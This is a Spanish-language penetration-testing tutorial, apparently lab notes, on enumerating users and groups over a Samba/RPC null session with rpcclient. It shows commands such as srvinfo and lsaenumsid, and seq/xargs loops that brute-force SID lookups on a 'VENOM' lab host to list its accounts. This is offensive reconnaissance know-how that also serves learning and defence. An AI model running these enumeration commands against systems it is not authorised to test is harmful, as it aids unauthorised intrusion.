# ENUMERACION CON RPCCLIENTE
## Enumeración de recursos compartidos RPC

### ¿Qué es un RID?
---

Un Identificador Relativo (RID) es un identificador único (representado en formato hexadecimal) utilizado por Windows para rastrear e identificar objetos. Para explicar cómo encaja esto, veamos los siguientes ejemplos:

El SID del dominio NAME_DOMAIN.LOCAL es: S-1-5-21-1038751438-1834703946-36937684957. Cuando se crea un objeto dentro de un dominio, el número anterior (SID) se combinará con un RID para crear un valor único utilizado para representar el objeto.
### Enumeracion rpcclient
---
Si en la fase enumeración se encontrado expuesto el servicio `rpc-->139`, existe la posibilidad e explotar la vulnerabilidad de nullsession, por lo que esto se puede ejecutar una validación con la herramienta `rpcclient`.
```ruby
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
┌──(s3cur1ty3c㉿kali)-[~]
└─$ rpcclient -N -U "" 192.168.200.149
rpcclient $> srvinfo
        VENOM          Wk Sv PrQ Unx NT SNT venom server (Samba, Ubuntu)
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03
rpcclient $>
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
Como se puede apreciar en la ejecución anterior, una vez accedido al equipo victima mediante rpcclient, aprovechando nullsession, se puede usar el comando `srvinfo`, para extraer información del equipo accedido.
#### Detalles
```ruby 
┌──(s3cur1ty3c㉿kali)-[~]
└─$ rpcclient -N -U "" 192.168.200.149 -c "help" | grep -i SID
       uidtosid         Convert uid to sid
     lookupsids         Convert SIDs to names
    lookupsids3         Convert SIDs to names
lookupsids_level                Convert SIDs to names
    lookupnames         Convert names to SIDs
   lookupnames4         Convert names to SIDs
lookupnames_level               Convert names to SIDs
     lsaenumsid         Enumerate the LSA SIDS
lsaenumprivsaccount             Enumerate the privileges of an SID
lsaenumacctrights               Enumerate the rights of an SID
     lsaaddpriv         Assign a privilege to a SID
     lsadelpriv         Revoke a privilege from a SID
lsaquerytrustdominfo            Query LSA trusted domains info (given a SID)
lsaquerytrustdominfobysid               Query LSA trusted domains info (given a SID)                                                                              
```
> * -N.- nullsession
> * -U.- Usuario.
> * -c.- Flag para emitir un comando
En la ejecución anterior se realizó un filtrado con `SID`, para buscar los comandos que permitan enumerar usuarios, para enumerar los RID, se puede ejecutar el comando lsaenumsid.

```ruby 
┌──(s3cur1ty3c㉿kali)-[~]
└─$ rpcclient -N -U "" 192.168.200.149 -c "lsaenumsid"                              
found 6 SIDs

S-1-5-32-550
S-1-5-32-548
S-1-5-32-551
S-1-5-32-549
S-1-5-32-544
S-1-1-0
```

Para hacer una enumeración se puede utilizar un secuenciador `seq` y el comando `xargs` para enviar la ejecución mediante hilos, y que esto permita agilizar la enumeración.

```ruby 
┌──(s3cur1ty3c㉿kali)-[~]
└─$ seq 1 1000 | xargs -P 50 -I {} rpcclient -N -U "" 192.168.200.149 -c "lookupsids S-1-5-32-{}" | grep -v "unknown"
S-1-5-32-547 BUILTIN\Power Users (4)
S-1-5-32-546 BUILTIN\Guests (4)
S-1-5-32-545 BUILTIN\Users (4)
S-1-5-32-548 BUILTIN\Account Operators (4)
S-1-5-32-544 BUILTIN\Administrators (4)
S-1-5-32-551 BUILTIN\Backup Operators (4)
S-1-5-32-557 BUILTIN\Incoming Forest Trust Builders (4)
S-1-5-32-554 BUILTIN\Pre-Windows 2000 Compatible Access (4)
S-1-5-32-556 BUILTIN\Network Configuration Operators (4)
S-1-5-32-550 BUILTIN\Print Operators (4)
S-1-5-32-552 BUILTIN\Replicator (4)
S-1-5-32-553 BUILTIN\RAS Servers (4)
S-1-5-32-549 BUILTIN\Server Operators (4)
S-1-5-32-555 BUILTIN\Remote Desktop Users (4)
S-1-5-32-558 BUILTIN\Performance Monitor Users (4)
S-1-5-32-560 BUILTIN\Windows Authorization Access Group (4)
S-1-5-32-559 BUILTIN\Performance Log Users (4)
S-1-5-32-561 BUILTIN\Terminal Server License Servers (4)
S-1-5-32-562 BUILTIN\Distributed COM Users (4)
S-1-5-32-569 BUILTIN\Cryptographic Operators (4)
S-1-5-32-573 BUILTIN\Event Log Readers (4)
S-1-5-32-574 BUILTIN\Certificate Service DCOM Access (4)
```

Tambien se puede hacer un descubrimiento a nivel nombres de usuario, y esto permite extaer el RID del usuario, esto se puede ejecutar con el comando `lookupnames`.

```ruby
┌──(s3cur1ty3c㉿kali)-[~]
└─$ rpcclient -N -U "" 192.168.200.149 -c "lookupnames root" 
root S-1-22-1-0 (User: 1)
```

Una vez identificado lo los RID de usuarios del sistema, se puede ejecutar un secuenciador para hacer enumeración de los usuarios.

```ruby
┌──(s3cur1ty3c㉿kali)-[~]
└─$ seq 1 1500 | xargs -P 50 -I {} rpcclient -N -U "" 192.168.200.149 -c "lookupsids S-1-22-1-{}" | grep -oP '.*User\\[a-z].*\s'
S-1-22-1-5 Unix User\games 
S-1-22-1-1 Unix User\daemon 
S-1-22-1-4 Unix User\sync 
S-1-22-1-7 Unix User\lp 
S-1-22-1-6 Unix User\man 
S-1-22-1-13 Unix User\proxy 
S-1-22-1-9 Unix User\news 
S-1-22-1-8 Unix User\mail 
S-1-22-1-2 Unix User\bin 
S-1-22-1-10 Unix User\uucp 
S-1-22-1-3 Unix User\sys 
S-1-22-1-34 Unix User\backup 
S-1-22-1-33 Unix User\www-data 
S-1-22-1-41 Unix User\gnats 
S-1-22-1-38 Unix User\list 
S-1-22-1-39 Unix User\irc 
S-1-22-1-100 Unix User\systemd-network 
S-1-22-1-101 Unix User\systemd-resolve 
S-1-22-1-103 Unix User\messagebus 
S-1-22-1-119 Unix User\pulse 
S-1-22-1-102 Unix User\syslog 
S-1-22-1-111 Unix User\speech-dispatcher 
S-1-22-1-107 Unix User\usbmux 
S-1-22-1-109 Unix User\rtkit 
S-1-22-1-110 Unix User\cups-pk-helper 
S-1-22-1-108 Unix User\dnsmasq 
S-1-22-1-105 Unix User\uuidd 
S-1-22-1-106 Unix User\avahi-autoipd 
S-1-22-1-112 Unix User\whoopsie 
S-1-22-1-114 Unix User\saned 
S-1-22-1-113 Unix User\kernoops 
S-1-22-1-116 Unix User\colord 
S-1-22-1-118 Unix User\geoclue 
S-1-22-1-121 Unix User\gdm 
S-1-22-1-122 Unix User\mysql 
S-1-22-1-117 Unix User\hplip 
S-1-22-1-120 Unix User\gnome-initial-setup 
S-1-22-1-115 Unix User\avahi 
S-1-22-1-123 Unix User\ftp 
S-1-22-1-999 Unix User\vboxadd 
S-1-22-1-1002 Unix User\hostinger 
S-1-22-1-1000 Unix User\nathan 
```